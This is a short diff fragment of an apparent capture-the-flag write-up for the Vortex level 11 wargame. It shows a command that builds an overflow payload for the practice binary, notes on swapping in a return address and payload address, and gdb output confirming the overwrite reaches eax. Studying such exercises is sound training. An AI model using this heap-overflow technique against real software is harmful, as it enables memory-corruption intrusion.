@@ -31,7 +31,7 @@ int main(int argc, char **argv) {
   
 preparing payloads: ./vortex11 $(python -c 'print "A"*0x800+"BBBB"+"CCCC"') $(python -c 'print "ADDR"')  
 need to replace CCCC with ret addr, ADDR with payload addr...  
-verifing that it works:
+verifing that it works (result of malloc() in eax):
 ```bash
 (gdb) info reg
 eax            0x43434383       1128481667
